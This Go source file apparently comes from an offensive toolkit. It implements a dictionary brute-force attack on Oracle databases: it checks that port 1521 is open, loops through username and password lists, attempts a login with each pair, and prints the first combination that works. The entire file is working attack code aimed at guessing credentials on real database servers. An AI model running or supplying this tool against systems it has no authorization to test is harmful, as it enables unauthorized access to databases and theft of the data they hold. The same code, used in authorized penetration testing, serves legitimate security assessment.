package database

import (
	"database/sql"
	"fmt"

	"github.com/seaung/gagako/pkg/utils"
)

func oracleUnauthorized(host, port, username, password string) (bool, error) {
	db, err := sql.Open("godror", fmt.Sprintf("%s/%s@%s:%s/orcl", username, password, host, port))
	defer db.Close()

	if err != nil {
		return false, err
	}

	if err := db.Ping(); err != nil {
		return false, err
	}

	return true, nil
}

func OracleBureforce(target, userdict, passdict string) {
	if utils.IsOpenPort(target, 1521) {
	Loop:
		for _, user := range utils.LoadUserDict(userdict) {
			for _, pass := range utils.LoadPasswordDict(passdict) {
				ok, err := oracleUnauthorized(target, "1521", user, pass)
				if ok && err == nil {
					utils.New().Success(fmt.Sprintf("Target :: %s username :: %s password :: %s", target, user, pass))
					break Loop
				}
			}
		}
	}
}
